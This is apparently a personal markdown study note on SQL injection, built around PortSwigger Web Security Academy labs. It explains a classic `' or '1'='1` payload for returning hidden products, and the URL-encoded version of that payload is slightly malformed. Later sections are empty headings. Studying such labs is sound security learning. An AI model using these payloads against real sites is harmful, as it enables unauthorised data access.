# Web Hacking 101

## Table of content
 - [SQL Injection](#sql-injection)
   - [Retrieving hidden data](#retrieving-hidden-data)
   - [UNION attacks](#union-attacks)
   - [Blind SQL injection](#blind-sql-injection)

### SQL Injection

Details at [here](https://portswigger.net/web-security/sql-injection)

Type of SQL injection in example

- Retrieving hidden data
- UNION attacks
- Blind SQL injection

## Retrieving hidden data

Modify an SQL query to return additional results

[Lab 1](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)

Description of this lab: the query of 1 category `Gifts`

`SELECT * FROM products WHERE category = 'Gifts' AND released = 1`

And sample URL query: `https://example.com/filter?category=Gifts`

Goal: display details of all products in any category, both *released and unreleased*

`SELECT * FROM products WHERE category = '' or '1'='1' AND released = 1`

We just only adjust in `category=` and put into `''`, so the final payload:
`' or '1'='1` or `https://example.com/filter?category=%27%20or%20%271%27or%271`

[Lab 2](https://portswigger.net/web-security/sql-injection/lab-login-bypass)

Description of this lab: inject in login page:


## UNION attacks

## Blind SQL injection


